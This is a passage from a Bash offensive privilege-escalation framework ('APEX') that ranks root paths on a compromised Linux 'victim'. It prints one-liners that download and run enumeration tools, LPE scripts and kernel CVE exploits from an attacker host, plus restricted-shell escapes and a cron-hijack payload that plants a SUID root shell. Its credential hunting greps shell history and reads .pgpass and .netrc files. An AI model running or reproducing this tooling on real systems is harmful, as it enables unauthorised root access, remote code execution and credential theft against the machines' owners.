        apex_c SEC; printf 'VICTIM step 3 — RESTORE (run AFTER you catch the shell, or to revert):'; apex_c RESET; printf '\n'
        printf '  cp -p %s %s 2>/dev/null && rm -f %s\n' "$bk_path" "$cur_path" "$bk_path"
        printf '\n'

        apex_c WARN; printf 'NOTE:'; apex_c RESET
        printf ' verify with `ls -la %s` after step 2; %s ownership/perms must look unchanged to the runner.\n' \
            "$cur_path" "$cur_path"
        printf '\n'
        apex_rule
    done < "$actions_tmp"

    rm -f "$actions_tmp" 2>/dev/null
    return 0
}

print_pivot_prompt() {
    # Final manual-investigation guidance when all 10 layers exhausted.
    printf '\n'
    printf '═══════════════════════════════════════════════════════════════════\n'
    printf '  MANUAL INVESTIGATION GUIDANCE\n'
    printf '═══════════════════════════════════════════════════════════════════\n'
    printf '\n'
    printf '  Static analysis exhausted. Suggested manual surface:\n'
    printf '    □ Open ports (ss -ltnp / netstat -tlnp)\n'
    printf '    □ Running web/admin apps on localhost\n'
    printf '    □ Custom binaries in /opt /srv /usr/local/bin\n'
    printf '    □ Recent file modifications:  find / -newer /proc/1/exe -mmin -60 2>/dev/null\n'
    printf '    □ Wildcards inside scripts launched by cron/systemd\n'
    printf '    □ Database / API tokens in dotfiles, ~/.config, ~/.aws\n'
    printf '\n'

    # G1 — contextual hints based on what each layer found / detected
    local _ctx_any=0
    if [ -n "$APEX_FINDINGS_DIR" ] && [ -d "$APEX_FINDINGS_DIR" ]; then
        printf '  Contextual hints (based on this run):\n'

        # Layer 4 (integrity) — if package verifier is installed but found nothing
        if command -v debsums >/dev/null 2>&1; then
            _ctx_any=1
            printf '    □ debsums detected — verify modified package files:\n'
            printf '        debsums -c 2>/dev/null | head -20    # any line = tampered binary\n'
        elif command -v rpm >/dev/null 2>&1; then
            _ctx_any=1
            printf '    □ rpm detected — verify modified package files:\n'
            printf '        rpm -Va 2>/dev/null | grep -vE "^\\.+ +[cgl] " | head -20\n'
        fi

        # Layer 9 (MAC) — AppArmor / SELinux active?
        if [ -r /sys/kernel/security/apparmor/profiles ] || command -v aa-status >/dev/null 2>&1; then
            _ctx_any=1
            printf '    □ AppArmor present — list enforced profiles:\n'
            printf '        aa-status 2>/dev/null | head -20      # which profiles confine which bins\n'
            printf '        cat /sys/kernel/security/apparmor/profiles 2>/dev/null | head -10\n'
        fi
        if command -v getenforce >/dev/null 2>&1; then
            local _se; _se=$(getenforce 2>/dev/null)
            if [ "$_se" = "Enforcing" ]; then
                _ctx_any=1
                printf '    □ SELinux Enforcing — try contexts before exploits:\n'
                printf '        ls -Z /usr/local/bin 2>/dev/null | head ; sestatus 2>/dev/null\n'
            fi
        fi

        # Layer 3 (credentials) — bash_history hints from current run
        local _hf
        _hf=$(grep -rl 'NEIGHBOR_HISTORY_HOT\|HISTORY_' "$APEX_FINDINGS_DIR" 2>/dev/null | head -1)
        if [ -n "$_hf" ] || [ -r ~/.bash_history ]; then
            _ctx_any=1
            printf '    □ History grep hints — check creds files:\n'
            printf '        grep -iE "mysql|psql|sudo|ssh -i|curl.*-u|password" ~/.bash_history 2>/dev/null | tail -20\n'
            printf '        cat ~/.my.cnf ~/.pgpass ~/.netrc 2>/dev/null\n'
        fi

        # SUID_REACHABLE_LATER findings → tell operator which user to pivot to
        local _r
        _r=$(grep -h '^SUID_REACHABLE_LATER' "$APEX_FINDINGS_DIR"/*.finding 2>/dev/null | head -3)
        if [ -n "$_r" ]; then
            _ctx_any=1
            printf '    □ Locked SUID binaries detected — pivot first:\n'
            printf '%s\n' "$_r" | awk -F'|' '{printf "        %s  (pivot via %s)\n", $2, $3}' | cut -c1-200
        fi

        [ "$_ctx_any" = "0" ] && printf '    (no contextual signals — see G2 fallback below)\n'
        printf '\n'
    fi

    # Add lateral-pivot suggestions if any were generated
    local pivots
    pivots=$(predict_lateral_path 2>/dev/null)
    if [ -n "$pivots" ]; then
        printf '  Lateral pivot candidates:\n'
        printf '%s\n' "$pivots" | while IFS= read -r pline; do
            printf '    %s\n' "$(safe_output "$pline")"
        done
        printf '\n'
    fi

    # Restricted shell escape — print BEFORE other fallbacks so operator sees it first
    if [ "${RESTRICTED:-0}" = "1" ]; then
        printf '  RESTRICTED SHELL DETECTED (%s) — try these escapes IN ORDER:\n' "${RESTRICTED_REASONS:-unknown}"
        printf '    1. Direct exec via interpreter (rbash blocks /bin but lets through built-ins/aliases):\n'
        printf "        python3 -c 'import os;os.system(\"/bin/bash\")'\n"
        printf "        perl -e 'exec \"/bin/bash\"'\n"
        printf "        awk 'BEGIN {system(\"/bin/bash\")}'\n"
        printf "        find / -name nonexistent -exec /bin/bash \\\\;\n"
        printf '    2. SSH ForceCommand bypass (if SSH key gives you rbash):\n'
        printf '        ssh user@host -t "bash --noprofile --norc"\n'
        printf '        ssh user@host -t "/bin/sh"\n'
        printf '    3. Editor escapes (vim/vi/less/man/more):\n'
        printf '        vi  → :set shell=/bin/bash → :shell\n'
        printf '        less filename → !/bin/bash\n'
        printf '        man man → !/bin/bash\n'
        printf '    4. Env-via-VAR exec (if PATH is locked but VAR can be set):\n'
        printf "        BASH_ENV=<(echo '/bin/bash') bash -i\n"
        printf "        ENV=<(echo '/bin/sh') sh -i\n"
        printf '    5. After escape — verify and re-run APEX:\n'
        printf '        echo $0 ; echo $- ; bash <(curl -fsSL %s/apex.sh)\n' "${APEX_ORIGIN_BASE:-http://YOUR_KALI:PORT}"
        printf '\n'
    fi

    # G2 — last-resort fallback playbook when nothing in the static analysis lit up
    printf '  IF EVERYTHING ABOVE FAILED — last-resort checks:\n'
    printf '    □ sudo timestamp reuse  (in case another tty already authed):\n'
    printf '        sudo -n true 2>/dev/null && sudo -n -l ; sudo -k\n'
    printf '    □ Forgotten root tty   (root left a shell open?):\n'
    printf '        w ; who ; ls -la /dev/pts/ ; ps -ef | grep -E "bash|sh" | grep root\n'
    printf '    □ Group-only files we missed:\n'
    printf '        for g in $(id -Gn); do find / -group "$g" -writable 2>/dev/null | head -5; done\n'
    printf '    □ Mounted shares, fstab tricks:\n'
    printf '        mount | grep -E "nfs|cifs|fuse|sshfs" ; cat /etc/fstab\n'
    printf '    □ GTFOBins fallback exhaustive (all sudo / SUID / cap binaries):\n'
    printf '        for b in $(sudo -n -l 2>/dev/null | grep -oE "/[^ ]+"); do echo "GTFOBins: $b → https://gtfobins.github.io/gtfobins/$(basename $b)/"; done\n'
    printf '    □ Re-run APEX with pspy harder (longer watch, catch slow cron):\n'
    printf '        APEX_PSPY_WAIT=180 bash <(curl -fsSL %s/apex.sh)\n' "${APEX_ORIGIN_BASE:-http://YOUR_KALI:PORT}"
    printf '\n'
    return 0
}
print_tool_oneliners() {
    # Print download+run one-liners for every staged tool and CVE PoC,
    # using APEX_EXEC_DIR as the target directory on the victim.
    [ -n "$APEX_ORIGIN_BASE" ] || return 0
    [ -n "$APEX_EXEC_DIR" ]    || return 0
    local _d="$APEX_EXEC_DIR"
    local _o="$APEX_ORIGIN_BASE"
    printf '\n'
    printf '═══════════════════════════════════════════════════════════════════\n'
    printf '  VICTIM ONE-LINERS  (writable exec dir: %s)\n' "$_d"
    printf '═══════════════════════════════════════════════════════════════════\n'
    printf '\n'
    printf '  [APEX]\n'
    printf '    curl -fsSL %s/apex.sh | bash\n' "$_o"
    printf '    curl -fsSL %s/apex.sh | bash -s -- --stealth\n' "$_o"
    printf '\n'

    printf '  [ENUM TOOLS]\n'
    # Derive tool list from APEX_MANIFEST_TOOLS if available, else fallback
    local _tools="$APEX_MANIFEST_TOOLS"
    if [ -z "$_tools" ]; then
        _tools="$(apex_select_pspy_arch) linpeas.sh lse.sh linenum.sh les.sh"
    fi
    local _t _run
    for _t in $_tools; do
        case "$_t" in
            apex.sh|manifest.txt|""|tools:*) continue ;;
            pspy*)       _run="chmod +x $_d/$_t && $_d/$_t -pf -i 1000" ;;
            linpeas*)    _run="bash $_d/$_t" ;;
            linenum*)    _run="bash $_d/$_t" ;;
            lse*)        _run="bash $_d/$_t -i" ;;
            les*)        _run="bash $_d/$_t" ;;
            *)           _run="$_d/$_t" ;;
        esac
        printf '    curl -fsSL %s/%s -o %s/%s && %s\n' \
            "$_o" "$_t" "$_d" "$_t" "$_run"
    done
    printf '\n'

    printf '  [BASH LPE SCRIPTS  (no gcc/python needed)]\n'
    local _lpe
    for _lpe in lpe_gameover lpe_suid_env lpe_capabilities lpe_sudo_enum lpe_writable_service lpe_dirtypipe_bash lpe_copy_fail; do
        printf '    curl -fsSL %s/bash_lpe/%s.sh -o %s/%s.sh && bash %s/%s.sh\n' \
            "$_o" "$_lpe" "$_d" "$_lpe" "$_d" "$_lpe"
    done
    printf '\n'

    printf '  [CVE PoCs  (try binary first, auto-fallback to source+compile)]\n'
    # Binary one-liners: curl binary → if 404 fallback to .c source + gcc compile.
    # This handles cases where Kali failed to pre-compile (serves .c only).
    local _cve_name _cve_pct _cve_type
    while IFS='|' read -r _cve_name _cve_pct _cve_type _rest; do
        [ -n "$_cve_name" ] || continue
        case "$_cve_type" in
            binary)
                printf '    # [%s%%] %s\n' "$_cve_pct" "$_cve_name"
                printf '    curl -fsSL %s/cve/%s -o %s/%s 2>/dev/null \\\n' \
                    "$_o" "$_cve_name" "$_d" "$_cve_name"
                printf '      && chmod +x %s/%s && %s/%s \\\n' \
                    "$_d" "$_cve_name" "$_d" "$_cve_name"
                printf '      || (curl -fsSL %s/cve/%s.c -o %s/%s.c 2>/dev/null \\\n' \
                    "$_o" "$_cve_name" "$_d" "$_cve_name"
                printf '          && gcc -static -o %s/%s %s/%s.c \\\n' \
                    "$_d" "$_cve_name" "$_d" "$_cve_name"
                printf '          && chmod +x %s/%s && %s/%s)\n' \
                    "$_d" "$_cve_name" "$_d" "$_cve_name"
                ;;
            bash)
                printf '    # [%s%%] %s\n' "$_cve_pct" "$_cve_name"
                printf '    curl -fsSL %s/cve/%s.sh -o %s/%s.sh && bash %s/%s.sh\n' \
                    "$_o" "$_cve_name" "$_d" "$_cve_name" "$_d" "$_cve_name"
                ;;
        esac
    done << 'CVE_TABLE'
CVE-2026-43284_dirtyfrag|99|binary
CVE-2026-31431_copy_fail|95|binary
CVE-2022-0847_dirtypipe|95|binary
CVE-2021-4034_pwnkit|90|binary
CVE-2023-2640_gameover|80|bash
CVE-2023-0386_overlayfs|78|binary
CVE-2023-32233_nft|75|binary
CVE-2023-4911_looney|75|binary
CVE_TABLE
    printf '\n'
    return 0
}

print_summary() {
    # Full top-10 ranked summary + runtime + next-step recommendation.
    [ -n "$APEX_FINDINGS_DIR" ] && [ -d "$APEX_FINDINGS_DIR" ] || return 0

    # Ensure chains.sorted is fresh
    build_confirmed_chains >/dev/null 2>&1

    local raw_count chain_count
    raw_count=$(find "$APEX_FINDINGS_DIR" -maxdepth 1 -name '*.finding' 2>/dev/null | wc -l | tr -d ' ')
    chain_count=0
    [ -r "${APEX_FINDINGS_DIR}/chains.sorted" ] && \
        chain_count=$(wc -l < "${APEX_FINDINGS_DIR}/chains.sorted" 2>/dev/null | tr -d ' ')

    # Runtime
    local now elapsed=0
    now=$(date +%s 2>/dev/null)
    if [ -n "${APEX_START_TIME:-}" ] && [ "$now" -gt 0 ]; then
        elapsed=$(( now - APEX_START_TIME ))
    fi

    printf '\n'
    printf '═══════════════════════════════════════════════════════════════════\n'
    printf '  APEX SUMMARY\n'
    printf '═══════════════════════════════════════════════════════════════════\n'
    printf '  Raw findings:      %s\n' "$raw_count"
    printf '  Confirmed chains:  %s\n' "$chain_count"
    printf '  Runtime:           %ss\n' "$elapsed"
    printf '\n'

    if [ "$chain_count" -gt 0 ]; then
        printf '  TOP 10 BY CONFIDENCE\n'
        printf '  ──────────────────────────────────────────────────────────────\n'
        head -10 "${APEX_FINDINGS_DIR}/chains.sorted" 2>/dev/null | \
            while IFS='|' read -r conf family path lcsv tcsv desc; do
                local bar=""
                local b=$conf
                while [ "$b" -ge 5 ]; do
                    bar="${bar}█"
                    b=$(( b - 5 ))
                done
                while [ "${#bar}" -lt 20 ]; do
                    bar="${bar}░"
                done
                printf '  [%2s%%] %s %-10s %s\n' \
                    "$conf" "$bar" "$(safe_output "$family")" \
                    "$(safe_output "$path")"
            done
        printf '\n'
        local top_conf top_type top_path
        IFS='|' read -r top_conf _ top_path _ top_type _ < "${APEX_FINDINGS_DIR}/chains.sorted"
        local top_primary
        top_primary=$(printf '%s' "$top_type" | awk -F',' '{print $1}')
        printf '  NEXT ACTION:  verify PATH 1 (%s%% — %s on %s)\n' \
            "$top_conf" "$(safe_output "$top_primary")" "$(safe_output "$top_path")"
    else
        printf '  NEXT ACTION:  no confirmed chains — see manual guidance below\n'
    fi
    printf '═══════════════════════════════════════════════════════════════════\n'
    return 0
}


# =============================================================================
# SECTION 9 — Adaptive Layer Controllers (1..10)
# =============================================================================
# Layers run in order. Each layer is skipped if the previous produced enough
# confirmed paths AND APEX_MODE is not "full". Layer 10 is always informational.

_finding_count() {
    [ -n "${APEX_FINDINGS_DIR:-}" ] && [ -d "$APEX_FINDINGS_DIR" ] || { printf '0'; return 0; }
    local c
    c=$(find "$APEX_FINDINGS_DIR" -maxdepth 1 -name '*.finding' 2>/dev/null | wc -l | tr -d ' ')
    printf '%s' "${c:-0}"
}

_finding_count_above() {
    # Count findings with confidence >= threshold $1
    local threshold="${1:-70}"
    [ -n "${APEX_FINDINGS_DIR:-}" ] && [ -d "$APEX_FINDINGS_DIR" ] || { printf '0'; return 0; }
    local count=0 f conf
    for f in "$APEX_FINDINGS_DIR"/*.finding; do
        [ -f "$f" ] || continue
        conf=$(awk -F'|' '{print $4}' "$f" 2>/dev/null | head -1)
        case "$conf" in ''|*[!0-9]*) continue ;; esac
        [ "$conf" -ge "$threshold" ] 2>/dev/null && count=$(( count + 1 ))
    done
    printf '%s' "$count"
}

_layer_should_skip() {
    # If APEX_MODE != "full" AND the running tally already includes a chain at
    # >= APEX_CONF_THRESHOLD (default 90), skip non-essential layers.
    #
    # IMPORTANT: pure "delivery" findings — staged CVE PoCs and staged
    # enumerators — are informational, not host-specific privesc paths. They
    # must NOT trip the skip threshold; otherwise staging 8 high-success-rate
    # CVEs causes layers 2-9 to stop and the operator loses host-specific
    # findings (FOREIGN_FILE_IN_WRITABLE_DIR, CUSTOM_BIN_PATH_HIJACK, etc.).
    [ "${APEX_MODE:-normal}" = "full" ] && return 1
    local threshold="${APEX_CONF_THRESHOLD:-90}"
    [ -n "${APEX_FINDINGS_DIR:-}" ] || return 1
    [ -d "$APEX_FINDINGS_DIR" ] || return 1
    local f rec conf lens
    for f in "$APEX_FINDINGS_DIR"/*.finding; do
        [ -f "$f" ] || continue
        rec=$(head -1 "$f" 2>/dev/null)
        conf=$(printf '%s' "$rec" | awk -F'|' '{print $4}')
        lens=$(printf '%s' "$rec" | awk -F'|' '{print $5}')
        case "$conf" in ''|*[!0-9]*) continue ;; esac
        # Exclude delivery-layer findings — they're not real privesc chains.
        case "$lens" in
            cve_stage|tool_stage) continue ;;
        esac
        [ "$conf" -ge "$threshold" ] && return 0
    done
    return 1
}

_layer_wrap_end() {
    # Args: num name next_num next_name delta_count
    local num="$1" name="$2" nnum="$3" nname="$4" delta="$5"
    if [ "$delta" -le 0 ]; then
        print_empty_layer "$num" "$name" "$nnum" "$nname"
    else
        print_layer_status "$num" "$name" "COMPLETE" "$delta"
    fi
}

layer_1_dac() {
    local _s _n
    _s=$(_finding_count)
    check_passwd_writable
    check_shadow_writable
    check_global_env_files
    map_sudo            &
    map_suid_sgid       &
    map_capabilities    &
    map_cron            &
    map_systemd         &
    map_write_surface   &
    map_groups          &
    map_groups_files    &
    map_custom_binaries &
    map_nfs             &
    map_processes       &
    map_neighbors_unreadables &
    map_logrotate       &
    map_motd            &
    wait
    _n=$(( $(_finding_count) - _s ))
    _layer_wrap_end 1 "DAC Graph" 2 "Deep Reader" "$_n"
    return 0
}

layer_2_deep_read() {
    # For every existing finding whose path is a regular file, run read_deeply().
    # Visited-set tracking inside read_deeply prevents revisits. Time-bounded
    # by READER_MAX_TIME (default 60s) summed across all calls.
    local _s _n
    _s=$(_finding_count)
    if _layer_should_skip; then
        print_layer_status 2 "Deep Reader" "SKIPPED" 0
        return 0
    fi
    [ -n "${APEX_FINDINGS_DIR:-}" ] && [ -d "$APEX_FINDINGS_DIR" ] || {
        _layer_wrap_end 2 "Deep Reader" 3 "Credentials" 0
        return 0
    }

    # Reset reader state so the budget applies to this whole layer pass
    READER_VISITED=""
    READER_START_TIME=0

    local f rec path seen=" "
    for f in "$APEX_FINDINGS_DIR"/*.finding; do
        [ -f "$f" ] || continue
        rec=$(head -1 "$f" 2>/dev/null)
        path=$(printf '%s' "$rec" | awk -F'|' '{print $2}')
        [ -z "$path" ] && continue
        [ -f "$path" ] || continue
        case "$seen" in *" ${path} "*) continue ;; esac
        seen="${seen}${path} "
        read_deeply "$path" 0
    done
    _n=$(( $(_finding_count) - _s ))
    _layer_wrap_end 2 "Deep Reader" 3 "Credentials" "$_n"
    return 0
}

layer_3_credentials() {
    local _s _n
    _s=$(_finding_count)
    run_credential_hunt
    _n=$(( $(_finding_count) - _s ))
    _layer_wrap_end 3 "Credentials" 4 "Integrity" "$_n"
    return 0
}
layer_4_integrity() {
    local _s _n
    _s=$(_finding_count)
    if _layer_should_skip; then
        print_layer_status 4 "Integrity" "SKIPPED" 0
        return 0
    fi

    # Pick the verifier matching the detected package manager.
    local pkg="${PKG:-}"
    local out
    case "$pkg" in
        apt|dpkg)
            if command -v debsums >/dev/null 2>&1; then
                out=$(safe_run 30 debsums -c 2>/dev/null)
                if [ -n "$out" ]; then
                    printf '%s\n' "$out" | head -40 | while IFS= read -r modfile; do
                        [ -n "$modfile" ] || continue
                        register_finding "INTEGRITY_MODIFIED_BIN" "$modfile" \
                            "debsums reports modified: $modfile" 70 "integrity"
                    done
                fi
            fi
            ;;
        rpm|yum|dnf)
            if command -v rpm >/dev/null 2>&1; then
                out=$(safe_run 30 rpm -Va 2>/dev/null)
                if [ -n "$out" ]; then
                    printf '%s\n' "$out" | grep -E '^[S.M][^ ]+ +/' | head -40 \
                        | while IFS= read -r line; do
                            local mf
                            mf=$(printf '%s' "$line" | awk '{print $NF}')
                            register_finding "INTEGRITY_MODIFIED_BIN" "$mf" \
                                "rpm -Va flags as modified: $line" 70 "integrity"
                        done
                fi
            fi
            ;;
    esac

    # Out-of-package SUID detection — binaries not owned by a package.
    if command -v dpkg >/dev/null 2>&1; then
        apex_find / -perm -4000 -type f 2>/dev/null | head -40 | while IFS= read -r bin; do
            [ -f "$bin" ] || continue
            if ! safe_run 3 dpkg -S "$bin" >/dev/null 2>&1; then
                register_finding "INTEGRITY_CUSTOM_SUID" "$bin" \
                    "SUID binary not owned by any installed package" 75 "integrity"
            fi
        done
    elif command -v rpm >/dev/null 2>&1; then
        apex_find / -perm -4000 -type f 2>/dev/null | head -40 | while IFS= read -r bin; do
            [ -f "$bin" ] || continue
            if ! safe_run 3 rpm -qf "$bin" >/dev/null 2>&1; then
                register_finding "INTEGRITY_CUSTOM_SUID" "$bin" \
                    "SUID binary not owned by any installed RPM" 75 "integrity"
            fi
        done
    fi

    _n=$(( $(_finding_count) - _s ))
    _layer_wrap_end 4 "Integrity" 5 "Timeline" "$_n"
    return 0
}

layer_5_timeline() {
    # Files modified after the init process began running. /proc/1/exe is
    # initialized at boot, so newer-than-it is a tight "since-boot" filter.
    local _s _n
    _s=$(_finding_count)
    if _layer_should_skip; then
        print_layer_status 5 "Timeline" "SKIPPED" 0
        return 0
    fi

    local me
    me="${APEX_USER:-$(whoami 2>/dev/null)}"

    apex_find / -newer /proc/1/exe -type f 2>/dev/null | head -200 \
        | while IFS= read -r p; do
            [ -f "$p" ] || continue
            # Exclude system noise — these change on every boot normally
            case "$p" in
                /proc/*|/sys/*|/dev/*|/run/*|/var/run/*) continue ;;
                /tmp/.X11*|/var/log/*|/var/cache/*) continue ;;
                /var/lib/dpkg/*|/var/lib/apt/*|/var/lib/systemd/*) continue ;;
                /var/lib/cloud/*|/var/lib/update-notifier/*|/var/lib/logrotate/*) continue ;;
                /boot/grub/*|/boot/efi/*) continue ;;
                /usr/share/*|/usr/lib/debug/*) continue ;;
                *.log|*.pid|*.tmp|*.cache|*.lock|*.stamp) continue ;;
                /snap/*) continue ;;
            esac
            local owner
            owner=$(safe_run 2 stat -c '%U' "$p" 2>/dev/null)
            # Only report if INTERESTING: writable by us (not owner), in custom dirs,
            # or executable script owned by root in interesting location
            local interesting=0
            # Writable by us but owned by someone else = potential injection
            if [ -w "$p" ] && [ "$owner" != "$me" ]; then
                interesting=1
            fi
            # In /opt, /srv, /usr/local, /home (custom app territory)
            case "$p" in
                /opt/*|/srv/*|/usr/local/*|/home/*) interesting=1 ;;
            esac
            # Executable scripts in PATH-dirs owned by root
            case "$p" in
                /usr/bin/*|/usr/sbin/*|/bin/*|/sbin/*)
                    [ -x "$p" ] && interesting=1 ;;
            esac
            [ "$interesting" -eq 0 ] && continue

            local conf=45
            [ "$owner" = "root" ] && conf=$(apply_confidence_modifiers "$conf" +15)
            [ -w "$p" ] && [ "$owner" != "$me" ] && conf=$(apply_confidence_modifiers "$conf" +15)
            register_finding "TIMELINE_MODIFIED" "$p" \
                "Modified since boot (owner=$owner): $p" "$conf" "timeline"
        done

    _n=$(( $(_finding_count) - _s ))
    _layer_wrap_end 5 "Timeline" 6 "Dynamic" "$_n"
    return 0
}

# ─── apex_dynamic_alt_scan ───────────────────────────────────────────────────
# pspy-free dynamic detection. Runs five concurrent observers for a fixed
# 60-second window and merges their findings:
#   (1) /proc PID snapshot diff  — detects new processes (any UID), captures
#       cmdline, owner, parent; tags UID=0 spawns specially.
#   (2) atime-delta on cron dirs — compares stat -c %X before/after sleep;
#       any cron.daily/hourly/d/* file whose atime advanced WAS executed.
#   (3) inotifywait on cron + writable lure dirs (only if inotify-tools
#       present) — captures CREATE/MODIFY events.
#   (4) /proc/$$/status spawn-count delta (forks) — anomaly indicator only.
#   (5) /var/log/syslog and /var/log/auth.log new lines — CRON entries
#       reveal jobs without needing pspy. ROBUST against journal-only systems.
# Each observer registers findings independently — no shared state.
apex_dynamic_alt_scan() {
    local window="${1:-60}"
    [ "$window" -lt 30 ] && window=30
    [ "$window" -gt 120 ] && window=120

    local snap1 snap2 snap1_file snap2_file
    snap1_file="$APEX_TMP/dyn_snap1_$$"
    snap2_file="$APEX_TMP/dyn_snap2_$$"

    _snap_procs() {
        local out="$1"
        : > "$out"
        local p uid cmd
        for p in /proc/[0-9]*; do
            [ -r "$p/status" ] || continue
            uid=$(awk '/^Uid:/{print $2; exit}' "$p/status" 2>/dev/null)
            cmd=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null | tr -d '\r\n' | cut -c1-200)
            [ -n "$cmd" ] || continue
            printf '%s|%s|%s\n' "${p#/proc/}" "$uid" "$cmd" >> "$out"
        done
    }

    # cron / timer atime snapshot — non-destructive
    local atime_dirs="/etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly /etc/cron.d /etc/periodic"
    local atime_file1="$APEX_TMP/dyn_atime1_$$"
    local atime_file2="$APEX_TMP/dyn_atime2_$$"
    _snap_atime() {
        local out="$1" d f at
        : > "$out"
        for d in $atime_dirs; do
            [ -d "$d" ] || continue
            for f in "$d"/*; do
                [ -f "$f" ] || continue
                at=$(stat -c '%X' "$f" 2>/dev/null)
                [ -n "$at" ] && printf '%s|%s\n' "$f" "$at" >> "$out"
            done
        done
    }

    # /var/log/syslog tail position
    local syslog_pos1=0 syslog_pos2=0
    [ -r /var/log/syslog ] && syslog_pos1=$(wc -c < /var/log/syslog 2>/dev/null) && \
        syslog_pos1=${syslog_pos1:-0}

    _snap_procs "$snap1_file"
    _snap_atime "$atime_file1"

    # inotifywait observer (optional, runs concurrently in background).
    local inot_file=""
    local inot_pid=""
    if command -v inotifywait >/dev/null 2>&1; then
        inot_file="$APEX_TMP/dyn_inot_$$"
        (
            inotifywait -mrq -e create -e modify -e attrib --timefmt '%H:%M:%S' \
                --format '%T %w%f %e' \
                /tmp /var/tmp /dev/shm \
                /etc/cron.d /etc/cron.daily /etc/cron.hourly /var/spool/cron 2>/dev/null
        ) > "$inot_file" 2>/dev/null &
        inot_pid=$!
    fi

    # Wait the observation window. The sleep is the only blocking step;
    # observers above already snapshotted before sleep.
    sleep "$window"

    # Snapshot 2
    _snap_procs "$snap2_file"
    _snap_atime "$atime_file2"
    [ -r /var/log/syslog ] && syslog_pos2=$(wc -c < /var/log/syslog 2>/dev/null) && \
        syslog_pos2=${syslog_pos2:-0}

    # Stop inotifywait
    [ -n "$inot_pid" ] && kill "$inot_pid" 2>/dev/null
    [ -n "$inot_pid" ] && wait "$inot_pid" 2>/dev/null

    # ── Diff observer 1: new PIDs / new commands ────────────────────────────
    # snap2 lines absent from snap1 = newly-spawned processes.
    awk -F'|' '
        FILENAME == ARGV[1] { seen[$1"|"$3]=1; next }
        FILENAME == ARGV[2] {
            key=$1"|"$3
            if (!(key in seen)) print
        }
    ' "$snap1_file" "$snap2_file" 2>/dev/null | while IFS='|' read -r pid uid cmd; do
        [ -z "$cmd" ] && continue
        # Skip apex's own children (sleep, awk, head, find, etc.).
        case "$cmd" in
            *apex*|*"$APEX_TMP"*|sleep\ *|awk*|head*|grep*|stat\ *|*find*) continue ;;
        esac
        if [ "$uid" = "0" ]; then
            # New UID=0 process during our window = real signal.
            local _conf=70
            local _vec="DYNAMIC_NEW_UID0"
            # If cmdline matches a previously-found writable cron / SUID target,
            # bump to 90 — strongly suggests our cron hijack ran.
            case "$cmd" in
                */bank_backupd*|*python3*|*/bin/sh*-c*)
                    _conf=85 ;;
            esac
            register_finding "$_vec" "$cmd" \
                "New root process during ${window}s window (pid=$pid): $(safe_output "$cmd" | cut -c1-160)" \
                "$_conf" "dynamic_proc"
        else
            # Non-root spawn — still useful (cron may run as service user).
            register_finding "DYNAMIC_NEW_PROC" "$cmd" \
                "New process during ${window}s window (uid=$uid pid=$pid): $(safe_output "$cmd" | cut -c1-160)" \
                40 "dynamic_proc"
        fi
    done

    # ── Diff observer 2: cron atime delta ───────────────────────────────────
    # Files whose access-time advanced during our window were READ (executed).
    awk -F'|' '
        FILENAME == ARGV[1] { a[$1]=$2; next }
        FILENAME == ARGV[2] {
            if ($1 in a && $2 > a[$1]) print $1
        }
    ' "$atime_file1" "$atime_file2" 2>/dev/null | while IFS= read -r f; do
        [ -z "$f" ] && continue
        # An atime advance on a cron file = cron just ran it. If the file is
        # foreign-owned and we can write its dir, this is the hijack target.
        local _fown
        _fown=$(stat -c '%U' "$f" 2>/dev/null)
        local _parent
        _parent=$(dirname "$f")
        if verify_actually_writable "$_parent" 2>/dev/null; then
            register_finding "DYNAMIC_CRON_DIR_HIJACK" "$f" \
                "cron job RAN during ${window}s window AND parent dir writable: $f (owner=$_fown) — delete+recreate hijack confirmed" \
                95 "dynamic_atime"
            register_exploit "DYNAMIC_CRON_DIR_HIJACK" "$f" \
                "rm -f $f; printf '#!/bin/bash -p\ncp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash; chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\n' > $f; chmod +x $f; sleep 65; ${APEX_EXEC_DIR:-/tmp}/rootbash -p"
        else
            register_finding "DYNAMIC_CRON_ACTIVE" "$f" \
                "cron job executed during ${window}s window (atime advanced): $f — confirm cron, then look at its callers/scripts" \
                60 "dynamic_atime"
        fi
    done

    # ── Diff observer 3: inotify file events ────────────────────────────────
    if [ -n "$inot_file" ] && [ -s "$inot_file" ]; then
        # Limit volume and uniqify.
        sort -u "$inot_file" 2>/dev/null | head -40 | while IFS= read -r line; do
            [ -z "$line" ] && continue
            case "$line" in
                *apex*|*"$APEX_TMP"*) continue ;;
            esac
            register_finding "DYNAMIC_INOTIFY" "fs_event" \
                "FS event during window: $(safe_output "$line" | cut -c1-160)" \
                45 "dynamic_inot"
        done
    fi
    [ -n "$inot_file" ] && rm -f "$inot_file"

    # ── Diff observer 4: syslog CRON entries ────────────────────────────────
    if [ -r /var/log/syslog ] && [ "$syslog_pos2" -gt "$syslog_pos1" ]; then
        local _new
        _new=$(safe_run 5 dd if=/var/log/syslog bs=1 skip="$syslog_pos1" \
                   count=$(( syslog_pos2 - syslog_pos1 )) 2>/dev/null)
        printf '%s\n' "$_new" | grep -iE 'CRON|systemd.*Started|systemd.*Starting' | \
            head -20 | while IFS= read -r line; do
            [ -z "$line" ] && continue
            register_finding "DYNAMIC_SYSLOG_CRON" "syslog" \
                "syslog cron/systemd event: $(safe_output "$line" | cut -c1-180)" \
                55 "dynamic_log"
        done
    fi

    # ── Diff observer 5: journalctl (systemd hosts without rsyslog) ─────────
    if command -v journalctl >/dev/null 2>&1 && [ ! -r /var/log/syslog ]; then
        safe_run 8 journalctl --since="${window} seconds ago" --no-pager 2>/dev/null | \
            grep -iE 'CRON|Started|Starting.*\.service' | head -20 | \
            while IFS= read -r line; do
            register_finding "DYNAMIC_JOURNAL" "journal" \
                "journal cron/service event: $(safe_output "$line" | cut -c1-180)" \
                55 "dynamic_log"
        done
    fi

    # Cleanup
    rm -f "$snap1_file" "$snap2_file" "$atime_file1" "$atime_file2" 2>/dev/null
    unset -f _snap_procs _snap_atime 2>/dev/null
    return 0
}

layer_6_dynamic() {
    local _s _n
    _s=$(_finding_count)
    if _layer_should_skip; then
        print_layer_status 6 "Dynamic" "SKIPPED" 0
        return 0
    fi

    # Strategy (one pass per available tool — they complement each other):
    #   1. If background pspy was started at scan init, wait/parse happens
    #      LATER in main() — but we ALWAYS run apex_dynamic_alt_scan here for
    #      cheap cron-atime + proc-diff coverage. pspy and the alt scan watch
    #      different signals (pspy=syscalls, alt=atime+proc-diff) so they do
    #      not duplicate.
